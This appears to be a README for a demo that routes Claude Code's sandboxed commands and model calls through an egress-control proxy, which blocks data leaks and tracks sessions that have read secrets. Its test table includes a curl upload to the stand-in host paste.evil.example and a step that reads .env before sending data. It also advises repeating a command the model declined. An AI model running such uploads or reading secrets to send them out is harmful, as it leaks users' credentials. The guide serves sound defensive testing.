# Use Claude Code with the demo

This guide connects Claude Code to the demo's Cortex instance and policy.
Sandboxed commands send their network traffic through Cortex. Model calls
and WebFetch use the proxy settings described below.

## What goes through Cortex

| Traffic | Route | Coverage |
|---|---|---|
| Sandboxed Bash and its children (`curl`, `git`, `npm`) | `sandbox.network.httpProxyPort` → `:47700` | Enforced: commands have no other network route |
| Claude Code's model calls and WebFetch | `HTTPS_PROXY` → `:47700` | Routed through Cortex while the process respects the proxy setting |
| Read, Edit, Write, local MCP servers, and hooks | No direct interception | Execution is outside the sandbox and Cortex's traffic inspection |

Model calls include tool results. When a result contains a recognized
secret, policy marks the session as having read it ("tainted"). Route model
calls and sandboxed commands to the same demo Cortex instance so they share
that session state.

## Run it

Run these commands from `demos/coding-agent-cpex`:

```sh
./run.sh up --claude-code               # adds the model API and registry/VCS hosts
claude-code/setup.sh settings           # writes .state/claude-code/settings.json
cd .state/workspace && claude --settings ../claude-code/settings.json
```

Send a message to Claude Code, then run this from the demo directory in
another terminal:

```sh
claude-code/setup.sh wait
```

The command waits until Cortex records a successful model call (200) from
Claude Code to `api.anthropic.com`. Set `CLAUDE_INFERENCE_HOST` if you use a
gateway. This confirms that model calls reach the demo instance.

Ask Claude Code to run these from the workspace in order. The last step
marks the session as having read a secret.

| Ask it to run | Expect |
|---|---|
| `curl -sS --data-binary @report-clean.json https://paste.evil.example/upload` | `CONNECT tunnel failed, response 403` |
| the same with `-H 'Host: support.localtest.me'` | `CONNECT tunnel failed, response 403` |
| `curl -sS -H 'Content-Type: application/json' --data-binary @report-clean.json https://support.localtest.me:47711/projects/A/reports` | Accepted (201) |
| the same with `@report-with-key.json` | 403 `cpex.secret_in_body` |
| the clean report to `/projects/B/reports` | 403 `cpex.project_not_authorized` |
| read `.env`, then send the clean report to project A again | 403 `cpex.session_tainted_secret` |

If the model declines a command, the proxy has not been tested. Request the
exact command and check Cortex's decision on the session timeline:

```sh
curl -s "http://127.0.0.1:47701/v1/sessions/<id>" | jq
```

## What the settings do

The setup script fills in absolute paths in
[`settings.json.example`](settings.json.example). See the
[Claude Code sandboxing documentation](https://code.claude.com/docs/en/sandboxing)
for the setting names.

- `sandbox.enabled`, `failIfUnavailable`, `allowUnsandboxedCommands: false`:
  require sandboxed commands and disable retries outside the sandbox.
- `sandbox.network.httpProxyPort` and `socksProxyPort`: both to `:47700`.
  This moves the host allowlist to the demo policy. Both ports must be set
  to prevent Claude Code from running its other proxy. Cortex does not
  support SOCKS, so SOCKS clients fail.
- `env.HTTPS_PROXY`, `HTTP_PROXY`: route Claude Code's own requests through
  Cortex.
- `NODE_EXTRA_CA_CERTS`: adds the bridge CA to Node's trust store.
  `SSL_CERT_FILE`, `CURL_CA_BUNDLE`, `GIT_SSL_CAINFO`, and
  `REQUESTS_CA_BUNDLE` use `bundle.crt`, containing the bridge CA and system
  roots, because these settings replace the trust store. Go programs on
  macOS ignore `SSL_CERT_FILE`; `gh` and similar tools fail TLS unless
  `sandbox.enableWeakerNetworkIsolation` is set.
- `filesystem.denyRead` and `credentials` `deny` entries: the sandbox cannot
  read the developer identity, the mocks' CA, the bridge CA key or the
  support token. `SUPPORT_TOKEN` is also unset.
- `CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC`: keeps telemetry hosts off the
  allowlist.

Pass the generated file with `--settings`. Claude Code ignores `credentials`
entries in project and local settings, including `.claude/settings.local.json`.

## Hosts

`--claude-code` allows and inspects model calls to `api.anthropic.com`.
It also allows package registries and source control hosts as passthrough
destinations: Cortex does not decrypt, inspect, or buffer their traffic.
A tainted session can still push to a passthrough host.

Set `CLAUDE_CODE_LLM_HOSTS` and `CLAUDE_CODE_PASSTHROUGH_HOSTS` to change
these lists. Other hosts are blocked with `cpex.egress_host_not_allowed`.

## In a real deployment

Enforce sandbox and proxy configuration through managed settings. Set
`sandbox.network.allowManagedDomainsOnly: true` so Claude Code accepts proxy
ports only from managed settings. Settings editable by a developer or
repository do not enforce this restriction.

## Limits

- The `.env` contents go to the model provider and onto the demo Cortex's
  session timeline. The key in the fixture is AWS's documented example.
- Session taint resets when the demo Cortex restarts or reloads its config.
- The workspace sits inside this repository, so Claude Code also loads the
  repository's `CLAUDE.md`.
